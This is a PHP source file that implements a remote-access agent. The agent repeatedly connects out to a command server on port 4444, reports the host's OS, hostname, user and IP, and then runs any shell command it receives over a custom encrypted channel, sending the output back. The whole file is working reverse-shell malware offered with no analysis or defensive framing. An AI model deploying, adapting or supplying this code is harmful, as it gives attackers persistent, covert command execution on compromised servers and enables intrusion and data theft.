<?php

error_reporting(0);
set_time_limit(0);

$serverHost = "0.0.0.0";
$serverPort = 4444;

function getLocalIP() {
    $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
    if ($socket === false) return "N/A";
    $result = @socket_connect($socket, "8.8.8.8", 80);
    if ($result === false) {
        socket_close($socket);
        return "N/A";
    }
    socket_getsockname($socket, $addr, $port);
    socket_close($socket);
    return $addr ?: "N/A";
}

function base64UrlDecode($input) {
    $remainder = strlen($input) % 4;
    if ($remainder) {
        $padlen = 4 - $remainder;
        $input .= str_repeat('=', $padlen);
    }
    return base64_decode(strtr($input, '-_', '+/'));
}

function base64UrlEncode($input) {
    return str_replace('=', '', strtr(base64_encode($input), '+/', '-_'));
}

function fernetDecrypt($token, $key) {
    try {
        $decoded = base64_decode($token);
        if (strlen($decoded) < 57) {
            return false;
        }
        $version = ord($decoded[0]);
        if ($version != 0x80) {
            return false;
        }
        $timestamp = substr($decoded, 1, 8);
        $iv = substr($decoded, 9, 16);
        $ciphertext = substr($decoded, 25, -32);
        $hmac = substr($decoded, -32);
        $signingKey = substr(hash('sha256', $key . 'signing', true), 0, 32);
        $encryptionKey = substr(hash('sha256', $key . 'encryption', true), 0, 32);
        $computedHmac = hash_hmac('sha256', substr($decoded, 0, -32), $signingKey, true);
        if (!hash_equals($hmac, $computedHmac)) {
            return false;
        }
        $decrypted = openssl_decrypt($ciphertext, 'AES-128-CBC', $encryptionKey, OPENSSL_RAW_DATA, $iv);
        return $decrypted;
    } catch (Exception $e) {
        return false;
    }
}

function fernetEncrypt($data, $key) {
    try {
        $version = chr(0x80);
        $timestamp = pack('J', time());
        $iv = openssl_random_pseudo_bytes(16);
        $signingKey = substr(hash('sha256', $key . 'signing', true), 0, 32);
        $encryptionKey = substr(hash('sha256', $key . 'encryption', true), 0, 32);
        $ciphertext = openssl_encrypt($data, 'AES-128-CBC', $encryptionKey, OPENSSL_RAW_DATA, $iv);
        $payload = $version . $timestamp . $iv . $ciphertext;
        $hmac = hash_hmac('sha256', $payload, $signingKey, true);
        $token = $payload . $hmac;
        return base64_encode($token);
    } catch (Exception $e) {
        return false;
    }
}

function executeCommand($command) {
    global $hostname,
    $user,
    $os,
    $arch,
    $agentIP;
    if ($command === "SYSINFO") {
        $output = "OS: $os\n";
        $output .= "Hostname: $hostname\n";
        $output .= "User: $user\n";
        $output .= "Arch: $arch\n";
        $output .= "Agent IP: $agentIP\n";
        $output .= "PHP Version: " . phpversion() . "\n";
        $output .= "Current Dir: " . getcwd();
        return $output;
    } elseif ($command === "SCREENSHOT") {
        return "ERROR: Screenshot not supported in PHP agent";
    } elseif (in_array(strtolower($command), ['exit', 'quit', 'disconnect'])) {
        return "Agent disconnecting...";
    }

    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );

    if (stripos(PHP_OS, 'WIN') === 0) {
        $process = proc_open("cmd /c " . $command . " 2>&1", $descriptors, $pipes);
    } else {
        $process = proc_open($command . " 2>&1", $descriptors, $pipes);
    }

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);

        fclose($pipes[1]);
        fclose($pipes[2]);

        proc_close($process);

        $result = $output . $error;
        return empty($result) ? "Command executed (no output)" : $result;
    }

    return "ERROR: Failed to execute command";
}

while (true) {
    echo "[*] Connecting to $serverHost:$serverPort\n";

    $socket = @stream_socket_client("tcp://$serverHost:$serverPort", $errno, $errstr, 10);

    if (!$socket) {
        echo "[-] Connection failed: $errstr ($errno)\n";
        sleep(5);
        continue;
    }

    echo "[+] Connected!\n";

    stream_set_blocking($socket, true);
    stream_set_timeout($socket, 10);

    $key = stream_get_contents($socket, 1024);
    $key = rtrim($key, "\x00\r\n");

    if (empty($key)) {
        echo "[-] No key received\n";
        fclose($socket);
        sleep(5);
        continue;
    }

    echo "[+] Key received (" . strlen($key) . " bytes)\n";

    $hostname = gethostname();
    $user = get_current_user();
    $os = PHP_OS;
    $arch = php_uname('m');
    $agentIP = getLocalIP();

    $info = json_encode(array(
        'OS' => $os,
        'Hostname' => $hostname,
        'User' => $user,
        'Architecture' => $arch,
        'AgentIP' => $agentIP,
        'Python' => 'PHP-' . phpversion()
    ), JSON_UNESCAPED_SLASHES);
    fwrite($socket, $info);
    fflush($socket);
    usleep(500000);
    echo "[+] Handshake complete\n";
    stream_set_timeout($socket, 300);
    while (!feof($socket)) {
        $encryptedCmd = stream_get_contents($socket, 8192);
        if ($encryptedCmd === false || $encryptedCmd === '') {
            echo "[-] Connection closed by server\n";
            break;
        }
        $command = fernetDecrypt($encryptedCmd, $key);
        if ($command === false) {
            echo "[-] Failed to decrypt command\n";
            continue;
        }
        echo "[+] Command received: " . substr($command, 0, 50) . "...\n";
        $output = executeCommand($command);
        if (strlen($output) > 1000000) {
            $output = substr($output, 0, 1000000) . "\n...[OUTPUT TRUNCATED - TOO LARGE]";
        }
        $encryptedOutput = fernetEncrypt($output, $key);
        if ($encryptedOutput === false) {
            echo "[-] Failed to encrypt output\n";
            continue;
        }
        fwrite($socket, $encryptedOutput . "<END>");
        fflush($socket);
        echo "[+] Response sent (" . strlen($encryptedOutput) . " bytes)\n";
        if (in_array(strtolower($command), ['exit', 'quit', 'disconnect'])) {
            break;
        }
    }
    fclose($socket);
    echo "[*] Disconnected. Reconnecting in 5 seconds...\n";
    sleep(5);
}